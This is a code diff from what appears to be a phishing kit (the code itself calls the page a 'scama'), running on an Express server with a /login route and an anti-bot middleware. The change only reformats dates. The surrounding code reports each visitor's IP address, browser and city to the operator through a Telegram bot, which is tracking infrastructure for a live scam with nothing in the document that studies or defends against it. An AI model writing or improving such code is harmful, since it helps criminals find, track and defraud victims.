@@ -53,18 +53,6 @@ const sendTelegramMessage = (text) => {
 
 const currentDate = new Date();
 
-const options = {
-  weekday: 'long',
-  year: 'numeric',
-  month: 'long',
-  day: 'numeric',
-  hour: '2-digit',
-  minute: '2-digit',
-  second: '2-digit',
-  timeZoneName: 'short',
-};
-
-const formattedDate = currentDate.toLocaleString('en-US', options);
 
 
 app.get('/login', async (req, res) => {
@@ -281,9 +269,7 @@ async function antiBotMiddleware(req, res, next) {
     
         try {
     
-            message += ` ✈️ ${ipAddress} visited your scama on ${formattedDate}\n
-            🌐 ${userAgent}\n
-            📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+            message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
     
             const sendMessage = sendMessageFor(botToken, chatId); 
             sendMessage(message);
